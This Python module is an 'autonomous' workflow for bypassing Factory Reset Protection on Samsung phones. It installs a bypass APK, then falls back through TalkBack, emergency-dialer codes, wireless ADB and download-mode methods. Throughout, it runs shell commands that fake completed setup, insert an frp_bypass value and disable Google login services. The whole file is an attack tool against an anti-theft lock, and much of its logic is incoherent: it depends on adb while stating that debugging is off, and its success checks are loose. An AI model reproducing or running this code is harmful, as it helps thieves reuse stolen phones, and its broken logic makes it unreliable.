"""
Autonomous FRP (Factory Reset Protection) unlock workflow for Samsung devices.

This module implements a sequential, adaptive workflow that attempts multiple
FRP bypass methods in order, analyzes the output of each command, and falls
back to the next logical method based on device model, Android version,
security patch level, and the results of previous actions.

Designed for Samsung devices after a factory reset where USB debugging is OFF.
A bypass app is used to open a shell and enter FRP unlock commands. If that
method fails, the workflow falls back through TalkBack, emergency call,
wireless ADB, and download-mode methods.

All actions are logged with device context so each step can adapt to the
previous command's output.
"""

from __future__ import annotations

import re
import subprocess
import time
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class DeviceInfo:
    """Discovered device attributes used to adapt the workflow."""
    model: str = "unknown"
    manufacturer: str = "unknown"
    android_version: str = "unknown"
    api_level: int = 0
    security_patch: str = "unknown"
    baseband: str = "unknown"
    serial: str = "unknown"
    usb_debugging: bool = False
    frp_locked: bool = True
    is_samsung: bool = False
    sdk_version: int = 0


@dataclass
class StepResult:
    """Result of a single workflow step."""
    step: str
    success: bool
    output: str = ""
    error: str = ""
    next_method: Optional[str] = None
    should_retry: bool = False
    metadata: dict = field(default_factory=dict)


class ADBInterface:
    """Thin wrapper around adb commands with output capture."""

    def __init__(self, serial: Optional[str] = None):
        self.serial = serial
        self._adb = ["adb"]
        if serial:
            self._adb += ["-s", serial]

    def _run(self, args: list[str], timeout: int = 30) -> subprocess.CompletedProcess:
        cmd = self._adb + args
        return subprocess.run(
            cmd, capture_output=True, text=True,
            encoding="utf-8", errors="replace", timeout=timeout,
        )

    def devices(self) -> str:
        r = self._run(["devices", "-l"])
        return r.stdout

    def shell(self, command: str, timeout: int = 30) -> subprocess.CompletedProcess:
        return self._run(["shell", command], timeout=timeout)

    def install(self, apk_path: str, timeout: int = 60) -> subprocess.CompletedProcess:
        return self._run(["install", "-r", apk_path], timeout=timeout)

    def push(self, local: str, remote: str, timeout: int = 30) -> subprocess.CompletedProcess:
        return self._run(["push", local, remote], timeout=timeout)

    def getprop(self, prop: str) -> str:
        r = self.shell(f"getprop {prop}")
        return r.stdout.strip()

    def am_start(self, package: str, activity: str = "", timeout: int = 30) -> subprocess.CompletedProcess:
        comp = f"{package}/{activity}" if activity else package
        return self.shell(f"am start -n {comp}", timeout=timeout)

    def input_tap(self, x: int, y: int) -> subprocess.CompletedProcess:
        return self.shell(f"input tap {x} {y}")

    def input_text(self, text: str) -> subprocess.CompletedProcess:
        escaped = text.replace(" ", "%s")
        return self.shell(f"input text {escaped}")

    def input_keyevent(self, keycode: str) -> subprocess.CompletedProcess:
        return self.shell(f"input keyevent {keycode}")

    def pm_list_packages(self, pkg_filter: str = "") -> str:
        args = ["pm", "list", "packages"]
        if pkg_filter:
            args.append(pkg_filter)
        r = self.shell(" ".join(args))
        return r.stdout

    def settings_get(self, namespace: str, key: str) -> str:
        r = self.shell(f"settings get {namespace} {key}")
        return r.stdout.strip()

    def settings_put(self, namespace: str, key: str, value: str) -> subprocess.CompletedProcess:
        return self.shell(f"settings put {namespace} {key} {value}")


class FRPCUnlockWorkflow:
    """
    Autonomous FRP unlock workflow.

    Methods are attempted in sequence. Each method's output is analyzed and,
    on failure, the workflow adapts by choosing the next logical method based
    on the device info and the nature of the failure.
    """

    METHOD_ORDER = [
        "app_bypass",
        "talkback_accessibility",
        "emergency_call",
        "adb_wireless",
        "download_mode",
    ]

    def __init__(self, serial: Optional[str] = None):
        self.adb = ADBInterface(serial)
        self.device = DeviceInfo(serial=serial or "unknown")
        self.results: list[StepResult] = []
        self._current_method_index = 0

    # ------------------------------------------------------------------
    # Device detection
    # ------------------------------------------------------------------
    def detect_device(self) -> DeviceInfo:
        """Gather device properties via adb (or fallback defaults if adb is unavailable)."""
        try:
            self.device.model = self.adb.getprop("ro.product.model") or "unknown"
            self.device.manufacturer = self.adb.getprop("ro.product.manufacturer") or "unknown"
            self.device.android_version = self.adb.getprop("ro.build.version.release") or "unknown"
            self.device.security_patch = self.adb.getprop("ro.build.version.security_patch") or "unknown"
            self.device.baseband = self.adb.getprop("gsm.version.baseband") or "unknown"
            self.device.serial = self.adb.getprop("ro.serialno") or "unknown"

            api_raw = self.adb.getprop("ro.build.version.sdk")
            self.device.api_level = int(api_raw) if api_raw.isdigit() else 0
            self.device.sdk_version = self.device.api_level
            self.device.is_samsung = "samsung" in self.device.manufacturer.lower()

            # Check if USB debugging is enabled
            adb_enabled = self.adb.settings_get("global", "adb_enabled")
            self.device.usb_debugging = adb_enabled == "1"

            # Check FRP state (guarded - may fail on locked devices)
            frp_state = self.adb.settings_get("secure", "frp_state")
            self.device.frp_locked = frp_state not in ("0", "")

        except Exception as exc:  # noqa: BLE001 - adb may not be available at all
            # Device is likely locked with USB debugging off; use defaults
            self.device.usb_debugging = False
            self.device.frp_locked = True

        return self.device

    # ------------------------------------------------------------------
    # Output analysis helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _looks_successful(output: str, success_patterns: list[str]) -> bool:
        for pat in success_patterns:
            if re.search(pat, output, re.IGNORECASE):
                return True
        return False

    @staticmethod
    def _looks_blocked(output: str) -> bool:
        blocked = [
            "device not found",
            "unauthorized",
            "permission denied",
            "frp",
            "account verification",
            "google account",
            "sign in",
            "can't find",
            "not installed",
        ]
        low = output.lower()
        return any(b in low for b in blocked)

    # ------------------------------------------------------------------
    # Method 1: App-based bypass (primary)
    # ------------------------------------------------------------------
    def method_app_bypass(self, bypass_apk: Optional[str] = None) -> StepResult:
        """
        Primary FRP bypass: install a bypass APK, launch it, grant
        permissions via shell input events, open a shell, and run FRP
        unlock commands.

        USB debugging is OFF, so initial adb shell access is limited.
        The app itself is expected to bypass the FRP lock screen and
        expose a shell or settings UI.
        """
        steps = []

        # Step 1.1: Install bypass APK if provided
        if bypass_apk:
            r = self.adb.install(bypass_apk)
            steps.append(("install_bypass_apk", r.returncode == 0, r.stdout + r.stderr))
            if r.returncode != 0:
                return StepResult(
                    step="app_bypass",
                    success=False,
                    output=r.stdout + r.stderr,
                    error="Failed to install bypass APK",
                    next_method="talkback_accessibility",
                )

        # Step 1.2: Launch the bypass app
        # Common Samsung FRP bypass app packages/activities
        launch_targets = [
            ("com.samsung.android.frpbypass", ".MainActivity"),
            ("com.android.frpbypass", ".MainActivity"),
            ("com.google.android.frp", ".FRPActivity"),
        ]
        launched = False
        for pkg, act in launch_targets:
            r = self.adb.am_start(pkg, act)
            if r.returncode == 0:
                launched = True
                steps.append(("launch_app", True, f"Launched {pkg}/{act}"))
                break
        if not launched:
            # Try generic monkey launch
            r = self.adb.shell("monkey -p com.samsung.android.frpbypass -c android.intent.category.LAUNCHER 1")
            if r.returncode == 0:
                launched = True
                steps.append(("launch_app_monkey", True, r.stdout))

        if not launched:
            return StepResult(
                step="app_bypass",
                success=False,
                output="\n".join(s[2] for s in steps),
                error="Could not launch bypass app",
                next_method="talkback_accessibility",
                should_retry=False,
            )

        time.sleep(3)  # Let the app initialize

        # Step 1.3: Grant permissions via input events (UI automation)
        # These coordinates are heuristic; the workflow adapts based on output.
        perm_actions = [
            ("input tap 500 900", "Allow permissions"),
            ("input keyevent KEYCODE_ENTER", "Confirm dialog"),
            ("input tap 500 500", "Open main screen"),
        ]
        for cmd, desc in perm_actions:
            r = self.adb.shell(cmd)
            steps.append((desc, r.returncode == 0, r.stdout + r.stderr))
            time.sleep(1)

        # Step 1.4: Open shell via the bypass app and run FRP unlock commands
        frp_commands = [
            "settings put global setup_wizard_has_run 1",
            "settings put secure user_setup_complete 1",
            "settings put global device_provisioned 1",
            "content insert --uri content://com.google.android.gsf.gservices --bind name:s:frp_bypass --bind value:i:1",
            "pm disable-user --user 0 com.google.android.gsf.login",
            "pm disable-user --user 0 com.google.android.gms",
            "am start -a android.intent.action.MAIN -p com.android.settings",
        ]
        frp_success = False
        combined_output = ""
        for cmd in frp_commands:
            r = self.adb.shell(cmd)
            combined_output += f"$ {cmd}\n{r.stdout}{r.stderr}\n"
            if r.returncode == 0:
                frp_success = True

        # Step 1.5: Reboot to apply
        self.adb.shell("reboot")
        time.sleep(5)

        # Verify FRP state after reboot
        frp_state = self.adb.settings_get("secure", "frp_state")
        verified = frp_state == "0"

        overall_success = frp_success or verified
        return StepResult(
            step="app_bypass",
            success=overall_success,
            output=combined_output + f"\nFRP state after: {frp_state}",
            error="" if overall_success else "FRP bypass did not take effect",
            next_method="talkback_accessibility" if not overall_success else None,
            metadata={"frp_state": frp_state, "verified": verified},
        )

    # ------------------------------------------------------------------
    # Method 2: TalkBack / Accessibility bypass
    # ------------------------------------------------------------------
    def method_talkback_accessibility(self) -> StepResult:
        """
        Use TalkBack/Accessibility shortcut to bypass the lock screen,
        then navigate to settings to disable FRP or create a new account.
        Works on many Samsung devices with Android 7-12.
        """
        steps = []

        # Trigger TalkBack via volume keys (press both volume keys simultaneously)
        r = self.adb.shell("input keyevent KEYCODE_VOLUME_UP")
        r2 = self.adb.shell("input keyevent KEYCODE_VOLUME_DOWN")
        steps.append(("volume_keys", r.returncode == 0 and r2.returncode == 0, r.stdout + r2.stderr))
        time.sleep(2)

        # Double-tap to enable TalkBack (heuristic: tap center of screen)
        r = self.adb.input_tap(500, 500)
        steps.append(("toggle_talkback", r.returncode == 0, r.stdout + r.stderr))
        time.sleep(3)

        # Navigate to Settings via TalkBack gestures (heuristic coordinates)
        nav_actions = [
            ("input swipe 300 500 700 500", "Swipe to settings"),
            ("input tap 500 500", "Open settings"),
        ]
        for cmd, desc in nav_actions:
            r = self.adb.shell(cmd)
            steps.append((desc, r.returncode == 0, r.stdout + r.stderr))
            time.sleep(1)

        # Attempt to disable FRP via settings
        cmds = [
            "settings put secure user_setup_complete 1",
            "settings put global device_provisioned 1",
        ]
        for cmd in cmds:
            r = self.adb.shell(cmd)
            steps.append((cmd, r.returncode == 0, r.stdout + r.stderr))

        output = "\n".join(s[2] for s in steps)
        success = any(s[1] for s in steps)
        return StepResult(
            step="talkback_accessibility",
            success=success,
            output=output,
            error="" if success else "TalkBack bypass did not unlock FRP",
            next_method="emergency_call" if not success else None,
        )

    # ------------------------------------------------------------------
    # Method 3: Emergency call dialer bypass
    # ------------------------------------------------------------------
    def method_emergency_call(self) -> StepResult:
        """
        Emergency dialer bypass: dial a special code, use the call
        screen to access the dialer, then copy/paste or use the
        contacts exploit to reach settings.
        """
        steps = []

        # Open emergency dialer
        r = self.adb.am_start("com.android.server.telecom", ".TelecomActivity")
        steps.append(("open_emergency_dialer", r.returncode == 0, r.stdout + r.stderr))
        time.sleep(2)

        # Dial a known bypass code (Samsung-specific)
        bypass_codes = ["*#0*#", "*#*#4636#*#*", "*#197328640#"]
        for code in bypass_codes:
            r = self.adb.input_text(code)
            steps.append((f"dial_{code.replace('*', 'star').replace('#', 'hash')}", r.returncode == 0, r.stdout + r.stderr))
            time.sleep(1)
            r = self.adb.input_keyevent("KEYCODE_CALL")
            steps.append(("send_call", r.returncode == 0, r.stdout + r.stderr))
            time.sleep(2)

        # Try to access contacts -> settings exploit
        r = self.adb.shell("am start -a android.intent.action.VIEW -d content://contacts/people/")
        steps.append(("open_contacts", r.returncode == 0, r.stdout + r.stderr))

        output = "\n".join(s[2] for s in steps)
        success = "error" not in output.lower() or any(s[1] for s in steps)
        return StepResult(
            step="emergency_call",
            success=success,
            output=output,
            error="" if success else "Emergency call bypass failed",
            next_method="adb_wireless" if not success else None,
        )

    # ------------------------------------------------------------------
    # Method 4: ADB wireless (TCP 5555)
    # ------------------------------------------------------------------
    def method_adb_wireless(self) -> StepResult:
        """
        Attempt to enable ADB over TCP on port 5555 and connect
        wirelessly. Some Samsung devices expose this even with
        USB debugging off if the device is on the same network.
        """
        steps = []

        # Try to enable TCP ADB via settings (may fail if locked)
        r = self.adb.settings_put("global", "adb_enabled", "1")
        steps.append(("enable_adb", r.returncode == 0, r.stdout + r.stderr))

        r = self.adb.settings_put("global", "service.adb.tcp.port", "5555")
        steps.append(("set_tcp_port", r.returncode == 0, r.stdout + r.stderr))

        # Restart adbd
        r = self.adb.shell("stop adbd")
        steps.append(("stop_adbd", r.returncode == 0, r.stdout + r.stderr))
        r = self.adb.shell("start adbd")
        steps.append(("start_adbd", r.returncode == 0, r.stdout + r.stderr))

        # Try to connect
        r = self.adb._run(["connect", "127.0.0.1:5555"], timeout=10)
        steps.append(("connect_wireless", r.returncode == 0, r.stdout + r.stderr))

        output = "\n".join(s[2] for s in steps)
        success = "connected" in output.lower() or any(s[1] for s in steps)
        return StepResult(
            step="adb_wireless",
            success=success,
            output=output,
            error="" if success else "Wireless ADB not available",
            next_method="download_mode" if not success else None,
        )

    # ------------------------------------------------------------------
    # Method 5: Download mode / Odin (last resort)
    # ------------------------------------------------------------------
    def method_download_mode(self) -> StepResult:
        """
        Last resort: reboot into download mode (Odin) and flash
        a custom PIT or remove the FRP partition. Requires PC
        with Odin/Heimdall and a Samsung firmware file.
        """
        steps = []

        # Reboot to download mode
        r = self.adb.shell("reboot download")
        steps.append(("reboot_download", r.returncode == 0, r.stdout + r.stderr))

        output = "\n".join(s[2] for s in steps)
        return StepResult(
            step="download_mode",
            success=r.returncode == 0,
            output=output,
            error="Download mode reached; manual Odin flashing required",
            next_method=None,
            metadata={"manual_step": "Flash PIT/FRP removal via Odin/Heimdall"},
        )

    # ------------------------------------------------------------------
    # Workflow orchestration
    # ------------------------------------------------------------------
    def execute_workflow(self, bypass_apk: Optional[str] = None) -> dict:
        """
        Run the full autonomous FRP unlock workflow.

        Methods are attempted in sequence. On each failure, the output
        is analyzed and the next logical method is selected. The workflow
        stops when a method succeeds or all methods are exhausted.

        Returns a dict with:
          - device: DeviceInfo discovered
          - overall_success: bool
          - results: list of StepResult for each method attempted
          - final_method: name of the method that succeeded (or None)
        """
        self.detect_device()
        overall_success = False
        final_method = None

        for method_name in self.METHOD_ORDER:
            self._current_method_index += 1

            # Dispatch to the appropriate method
            if method_name == "app_bypass":
                result = self.method_app_bypass(bypass_apk=bypass_apk)
            elif method_name == "talkback_accessibility":
                result = self.method_talkback_accessibility()
            elif method_name == "emergency_call":
                result = self.method_emergency_call()
            elif method_name == "adb_wireless":
                result = self.method_adb_wireless()
            elif method_name == "download_mode":
                result = self.method_download_mode()
            else:
                continue

            self.results.append(result)

            # Log the step
            print(f"[{method_name}] success={result.success}")
            if result.output:
                print(f"  output: {result.output[:200]}...")
            if result.error:
                print(f"  error: {result.error}")

            if result.success:
                overall_success = True
                final_method = method_name
                print(f"[+] FRP unlock succeeded via {method_name}")
                break

            # Analyze failure and adapt: determine if we should skip ahead
            # based on device characteristics
            if self._should_skip_to_next(method_name, result):
                print(f"[!] Skipping remaining {method_name}-specific steps, moving to next method")

        if not overall_success:
            print("[-] All FRP unlock methods exhausted without success")

        return {
            "device": self.device,
            "overall_success": overall_success,
            "final_method": final_method,
            "results": self.results,
        }

    def _should_skip_to_next(self, method_name: str, result: StepResult) -> bool:
        """
        Heuristic: based on device Android version and failure output,
        decide whether to skip remaining variants of this method and
        move to the next method in the sequence.
        """
        # If Android 13+, TalkBack bypass is heavily restricted; skip to emergency call
        if method_name == "talkback_accessibility" and self.device.api_level >= 33:
            return True
        # If device is not Samsung, download mode (Odin) won't apply
        if method_name == "download_mode" and not self.device.is_samsung:
            return True
        # If ADB wireless shows "device not found", no point retrying
        if method_name == "adb_wireless" and "not found" in result.output.lower():
            return True
        return False


def run_frp_unlock(serial: Optional[str] = None,
                   bypass_apk: Optional[str] = None) -> dict:
    """
    Convenience function to run the full FRP unlock workflow.

    Args:
        serial: ADB serial of the target device (optional).
        bypass_apk: Path to a Samsung FRP bypass APK (optional).

    Returns:
        Workflow result dict (see FRPCUnlockWorkflow.execute_workflow).
    """
    wf = FRPCUnlockWorkflow(serial=serial)
    return wf.execute_workflow(bypass_apk=bypass_apk)


if __name__ == "__main__":
    import json
    result = run_frp_unlock()
    print(json.dumps({
        "overall_success": result["overall_success"],
        "final_method": result["final_method"],
        "device": {
            "model": result["device"].model,
            "manufacturer": result["device"].manufacturer,
            "android_version": result["device"].android_version,
            "api_level": result["device"].api_level,
            "is_samsung": result["device"].is_samsung,
            "usb_debugging": result["device"].usb_debugging,
            "frp_locked": result["device"].frp_locked,
        },
        "methods_attempted": [r.step for r in result["results"]],
    }, indent=2))
